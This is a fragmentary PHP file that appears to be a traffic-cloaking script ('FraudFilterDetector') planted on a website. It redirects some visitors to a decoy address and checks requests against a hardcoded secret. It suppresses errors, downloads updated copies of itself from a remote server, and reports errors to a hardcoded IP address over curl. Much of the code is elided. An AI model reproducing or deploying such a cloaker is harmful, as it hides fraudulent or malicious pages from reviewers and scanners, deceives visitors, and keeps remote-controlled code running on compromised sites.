<?php
header("Location: http://grange.audubon.org");
die();
?>
<?php
error_reporting(0);

class FraudFilterDetector_6lgop {
    ...
    function isSignatureValid($sign, $time) {
        $str = '2b5c87b6-9ab2-4b2f-9bef-d78c612c0e44.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('http://grange.audubon.org');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 2b5c87b6-9ab2-4b2f-9bef-d78c612c0e44',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 2b5c87b6-9ab2-4b2f-9bef-d78c612c0e44';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 2b5c87b6-9ab2-4b2f-9bef-d78c612c0e44';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=6lgop&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_6lgop = new FraudFilterDetector_6lgop();
$fraudFilterDetector_6lgop->check();
